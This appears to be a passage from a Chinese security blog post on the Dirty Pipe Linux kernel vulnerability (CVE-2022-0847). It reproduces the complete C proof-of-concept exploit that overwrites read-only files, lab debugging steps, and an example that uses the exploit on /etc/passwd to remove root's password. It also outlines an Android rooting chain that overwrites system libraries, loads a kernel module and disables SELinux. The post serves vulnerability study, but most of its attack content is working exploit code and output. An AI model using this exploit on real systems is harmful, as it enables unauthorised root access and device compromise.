<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: GPL-2.0 */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Proof-of-concept exploit for the Dirty Pipe</span></span><br><span class="line"><span class="comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span></span><br><span class="line"><span class="comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span></span><br><span class="line"><span class="comment"> * file contents in the page cache, even if the file is not permitted</span></span><br><span class="line"><span class="comment"> * to be written, immutable or on a read-only mount.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This exploit requires Linux 5.8 or later; the code path was made</span></span><br><span class="line"><span class="comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span></span><br><span class="line"><span class="comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span></span><br><span class="line"><span class="comment"> * there before, it just provided an easy way to exploit it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are two major limitations of this exploit: the offset cannot</span></span><br><span class="line"><span class="comment"> * be on a page boundary (it needs to write one byte before the offset</span></span><br><span class="line"><span class="comment"> * to add a reference to this page to the pipe), and the write cannot</span></span><br><span class="line"><span class="comment"> * cross a page boundary.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Further explanation: https://dirtypipe.cm4all.com/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">prepare_pipe</span><span class="params">(<span class="type">int</span> p[<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">	   leaving the flags initialized) */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">	   will be mergeable */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* dumb command-line argument parser */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> path = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">loff_t</span> offset = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> data = argv[<span class="number">3</span>];</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">loff_t</span> end_offset = offset + (<span class="type">loff_t</span>)data_size;</span><br><span class="line">	<span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> fd = open(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">	<span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create the pipe with all flags initialized with</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line">	<span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">	   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">	   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">	--offset;</span><br><span class="line">	<span class="type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">	   will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It worked!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>环境：<a target="_blank" rel="noopener" href="https://registry.hub.docker.com/r/chenaotian/cve-2022-0847">https://registry.hub.docker.com/r/chenaotian/cve-2022-0847</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -ti --<span class="built_in">rm</span> -h cvedebug --name cvedebug --cap-add=SYS_PTRACE chenaotian/cve-2022-0847:latest /bin/bash</span><br><span class="line">docker <span class="built_in">exec</span> -it cvedebug /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/cve-2022-0847</span><br><span class="line">gcc exp.c -o exp --static &amp;&amp; <span class="built_in">cp</span> exp ./rootfs &amp;&amp; <span class="built_in">cd</span> rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="built_in">cd</span> ../ </span><br><span class="line">./boot.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux</span><br><span class="line">target remote :10086</span><br><span class="line">directory /root/linux-5.13</span><br><span class="line">b do_splice</span><br><span class="line">b copy_page_to_iter_pipe </span><br><span class="line">b pipe_write</span><br><span class="line">ignore 3 15</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct pipe_inode_info *) pipe</span><br><span class="line">pwndbg&gt; p (struct pipe_buffer)pipe-&gt;bufs[0]</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  page = 0xffffea0000134cc0,</span><br><span class="line">  offset = 0,</span><br><span class="line">  len = 4096,</span><br><span class="line">  ops = 0xffffffff82019fc0 &lt;anon_pipe_buf_ops&gt;,</span><br><span class="line">  flags = 16,	==&gt; 标记</span><br><span class="line">  private = 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p>编译上面的exp。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">head</span> -1 /etc/passwd <span class="comment"># 确认root受密码保护</span></span><br><span class="line"> root:x:0:0:root:/root:/usr/bin/zsh</span><br><span class="line">$ su                  <span class="comment"># 确认需要密码</span></span><br><span class="line">$ ./exp /etc/passwd 4 <span class="string">&#x27;::0:0:rootx&#x27;</span> <span class="comment"># 删除root密码保护</span></span><br><span class="line"> It worked!</span><br><span class="line">$ su                  <span class="comment"># 不需要输入密码</span></span><br></pre></td></tr></table></figure>

<h2 id="Android利用"><a href="#Android利用" class="headerlink" title="Android利用"></a>Android利用</h2><p><a target="_blank" rel="noopener" href="https://github.com/polygraphene/DirtyPipe-Android">DirtyPipe for Android</a>，这个漏洞利用复现有以下几个问题：</p>
<ul>
<li>需要编译内核源码，比较耗时间。</li>
<li>现有的pixel4 xl，Android12内核是4.14，没有到5.0以上。</li>
<li>没有pixel6的模拟器。</li>
</ul>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
<li>在 Android 上，没有 <code>/etc/passwd</code> 和 <code>suid</code>。此外，SELinux 监控系统上的每个操作。<ul>
<li>但是利用dirtypipe可以通过任何进程读取（和覆盖）系统库（<code>/system/lib/lib*.so</code>）。</li>
<li>init 进程加载许多系统库（动态链接）。</li>
<li>init 进程可以读取（和覆盖）比 app 进程更多的文件。</li>
<li>多次使用dirtypipe来加载定制的内核模块。</li>
</ul>
</li>
</ul>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul>
<li><p>该漏洞利用包括以下阶段：</p>
<ol>
<li>钩子初始化过程。</li>
<li>重写 <code>/vendor/bin/modprobe</code> 和供应商库。</li>
<li>fork() <code>/execve()</code> 进入 <code>/vendor/bin/modprobe</code>。</li>
<li>加载内核模块以禁用 selinux。</li>
</ol>
</li>
<li><p>阶段1</p>
<ol>
<li><p>覆盖init使用的<code>/system/lib64/libc++.so</code>。</p>
<ul>
<li><p>Hook函数<code>_ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev (std::__1::basic_streambuf&lt;char, std::__1::char_traits&lt;char&gt; &gt;::basic_streambuf())</code></p>
</li>
<li><p>通过运行命令<code>setprop</code>来触发该功能。</p>
</li>
</ul>
</li>
<li><p>发送下一阶段的有效载荷<code>/system/lib/libldacBT_enc.so</code>。</p>
<ul>
<li><p><code>libc++</code>空间有限。</p>
</li>
<li><p>32位的<code>libldacBT_enc.so</code>不应该频繁使用。</p>
</li>
</ul>
</li>
<li><p><code>libc++</code> 中的有效负载通过nmap加载用于 stage2 的有效负载<code>libldacBT_enc.so</code>。</p>
</li>
</ol>
</li>
<li><p>阶段2</p>
<ol>
<li>现在位于init进程中。</li>
<li>用 <code>modprobe-payload</code>覆盖<code>/vendor/bin/modprobe</code>。<ul>
<li>modprobe 有权加载内核模块。</li>
</ul>
</li>
<li>用内核模块 (mymod.ko) 的内容覆盖<code>/vendor/lib/libstagefright_soft_mp3dec.so</code>。<ul>
<li>modprobe 可以从 vendor_file 上下文加载内核模块。</li>
<li>之所以选择这个库，是因为它在 offset&#x3D;4096 处与 mymod.ko 具有相同的内容，并且无法被dirtypipe 覆盖。</li>
</ul>
</li>
<li>转换到<code>vendor_modprobe</code>上下文然后 <code>fork()/execve(/vendor/bin/modprobe)</code>。</li>
</ol>
</li>
<li><p>vendor_modprobe (modprobe-payload)</p>
<ol>
<li>打开（<code>/vendor/lib/libstagefright_soft_mp3dec.so</code>）<ul>
<li>文件内容被替换为 mymod.ko</li>
</ul>
</li>
<li>finit_module(mymod.ko)<ul>
<li>mymod.ko 将调用进程的 selinux 域设置为允许。</li>
</ul>
</li>
<li>运行<code>startup-root</code>脚本<ul>
<li>获取root。</li>
</ul>
</li>
</ol>
</li>
</ul>
<h4 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sesearch --allow policy-dump|grep module_load</span><br><span class="line">allow init-insmod-sh vendor_kernel_modules:system module_load;</span><br><span class="line">allow ueventd vendor_file:system module_load;</span><br><span class="line">allow vendor_modprobe vendor_file:system module_load;</span><br><span class="line"></span><br><span class="line">-rw-r--r-- 1 root root  u:object_r:system_lib_file:s0     43168 2009-01-01 09:00 /system/lib/libldacBT_enc.so</span><br><span class="line">-rw-r--r-- 1 root root  u:object_r:system_lib_file:s0     700392 2009-01-01 09:00 /system/lib64/libc++.so</span><br><span class="line">-rw-r--r-- 1 root root  u:object_r:vendor_file:s0         71068 2009-01-01 09:00 /vendor/lib/libstagefright_soft_mp3dec.so</span><br><span class="line">lrwxr-xr-x 1 root shell u:object_r:vendor_file:s0             7 2009-01-01 09:00 /vendor/bin/modprobe -&gt; toolbox</span><br></pre></td></tr></table></figure>

<ul>
<li><code>finit_module</code>可以加载<code>vendor_kernel_modules</code>或<code>vendor_file</code>。adb shell 或非系统应用程序都无法读取两者。所以内核模块必须由其他 selinux 上下文准备。<code>init</code>上下文可用于此（stage1 有效负载）。</li>
<li>init-insmod-sh 和 ueventd 也应该可用于此技术。（未实施&#x2F;测试）</li>
</ul>
<h4 id="添加对设备的支持"><a href="#添加对设备的支持" class="headerlink" title="添加对设备的支持"></a>添加对设备的支持</h4><ul>
<li>libc++.so 中的函数偏移量。</li>
<li>libc++.so 中的empty空间大小。</li>
<li><code>/vendor/bin/modprobe</code>可用性。</li>
<li><code>/vendor/lib/libstagefright_soft_mp3dec.so</code>可用性。<ul>
<li>必须与 mymod.ko 的内容匹配。</li>
</ul>
</li>
<li>为特定设备构建内核模块。</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/android/" rel="tag"># android</a>
              <a href="/tags/pipe/" rel="tag"># pipe</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/03/27/ARM64%E4%BB%8E0%E5%88%B0%E5%88%A9%E7%94%A8/" rel="prev" title="ARM64从0到利用">
                  <i class="fa fa-angle-left"></i> ARM64从0到利用
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/04/05/iOS-SockPuppet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="next" title="iOS-SockPuppet漏洞利用">
                  iOS-SockPuppet漏洞利用 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">buffer0verflooow</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
